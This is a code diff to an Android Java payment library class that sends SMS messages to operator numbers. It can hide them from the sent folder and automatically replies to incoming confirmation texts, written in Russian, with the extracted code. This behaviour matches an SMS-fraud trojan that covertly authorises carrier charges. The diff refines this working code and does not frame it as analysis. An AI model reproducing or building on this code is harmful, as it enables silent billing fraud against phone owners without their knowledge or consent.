@@ -22,13 +22,14 @@ import static com.p2plib2.PayLib.flagok;
 
 public class Operator {
     /**
-     * operator info
+     * operatorSMS info
      */
     public String name;
     public String smsNum;
     protected String ussdNum;
     public String target;
     protected String sum;
+    public static Integer simNum;
     /**
      * Additional settings
      */
@@ -45,16 +46,19 @@ public class Operator {
     }
 
 
-    public void sendSMS(Context cnt) {
+    public void sendSMS(Boolean sendWithSaveOutput, Context cnt) {
         String msgBody = createMsgBody();
         String number = getOperNum();
         SmsManager smsManager = SmsManager.getDefault();
+        this.sendWithSaveOutput = sendWithSaveOutput;
         try {
             Logger.lg(name + " num " + number + " " + sendWithSaveInput + " " + msgBody);
+            PendingIntent piSent = PendingIntent.getBroadcast(cnt, 0, new Intent("SMS_SENT"), 0);
+            PayLib.currentMsg = number + "[]" + msgBody;
             if (sendWithSaveOutput) {
-                smsManager.sendTextMessage(number, null, msgBody, null, null);
+                smsManager.sendTextMessage(number, null, msgBody, piSent, null);
             } else {
-                smsManager.sendTextMessageWithoutPersisting(number, null, msgBody, null, null);
+                smsManager.sendTextMessageWithoutPersisting(number, null, msgBody, piSent, null);
 
             }
         } catch (Exception e) {
@@ -100,8 +104,8 @@ public class Operator {
         if (sms_body.contains("отправьте") || sms_body.contains("ответьте")|| sms_body.contains("подтвердите")) {
             SmsManager smsManager = SmsManager.getDefault();
             String answ = "";
-            PendingIntent sentPI = PendingIntent.getBroadcast(cnt, 0, new Intent(
-                    "SMS_SENT"), 0);
+//            PendingIntent sentPI = PendingIntent.getBroadcast(cnt, 0, new Intent(
+//                    "SMS_SENT"), 0);
             if (sms_body.toLowerCase().contains("подтвердите")) {
                 answ = sms_body.substring(sms_body.indexOf("кодом ") + 6, sms_body.indexOf(" в ответном") + 1);
             } else {
@@ -113,10 +117,11 @@ public class Operator {
                 smsNum = smsSender;
             }
             Logger.lg("Answer  " + answ + " smsNum " + smsNum);
+            PendingIntent piSent = PendingIntent.getBroadcast(cnt, 0, new Intent("SMS_SENT"), 0);
             if (sendWithSaveOutput) {
-                smsManager.sendTextMessage(smsNum, null, answ, sentPI, null);
+                smsManager.sendTextMessage(smsNum, null, answ, piSent, null);
             } else {
-                smsManager.sendTextMessageWithoutPersisting(smsNum, null, answ, sentPI, null);
+                smsManager.sendTextMessageWithoutPersisting(smsNum, null, answ, piSent, null);
             }
 //            try {
 //                PayLib.feedback.callResult(sentPI.toString());
